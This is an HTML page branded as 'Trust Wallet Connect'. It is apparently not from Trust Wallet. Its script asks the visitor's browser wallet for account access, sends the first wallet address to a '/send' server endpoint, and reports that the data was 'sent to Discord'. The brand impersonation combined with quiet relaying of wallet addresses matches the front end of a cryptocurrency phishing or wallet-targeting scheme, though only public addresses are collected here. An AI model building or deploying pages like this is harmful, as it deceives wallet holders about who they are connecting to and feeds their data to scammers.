<!DOCTYPE html>
<html>
<head>
    <title>Trust Wallet</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: black;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        
        .container {
            text-align: center;
            color: white;
        }
        
        .connect-btn {
            background: #1B1B1B;
            color: white;
            border: 2px solid #666;
            padding: 20px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 30px;
        }
        
        .connect-btn:hover {
            background: #333;
        }
        
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Trust Wallet Connect</h1>
        <p>Click to connect your wallet</p>
        
        <button class="connect-btn" onclick="connectWallet()" id="btn">
            Connect Wallet
        </button>
        
        <div id="status"></div>
    </div>

    <script>
        async function connectWallet() {
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            
            if (!window.ethereum) {
                status.innerHTML = "Install Trust Wallet";
                return;
            }
            
            try {
                btn.disabled = true;
                btn.textContent = "Connecting...";
                status.innerHTML = "Waiting for approval...";
                
                // Connect wallet
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                if (accounts[0]) {
                    const wallet = accounts[0];
                    status.innerHTML = "Connected! Sending data...";
                    
                    // Send to server
                    const response = await fetch(`/send?wallet=${wallet}`);
                    const result = await response.json();
                    
                    if (result.success) {
                        status.innerHTML = "âœ… Data sent to Discord";
                        btn.textContent = "Connected";
                        btn.style.background = "#28a745";
                        btn.style.borderColor = "#28a745";
                    } else {
                        status.innerHTML = "Failed to send";
                        btn.disabled = false;
                        btn.textContent = "Try Again";
                    }
                }
                
            } catch (error) {
                status.innerHTML = "Error: " + error.message;
                btn.disabled = false;
                btn.textContent = "Connect Wallet";
            }
        }
    </script>
</body>
</html>
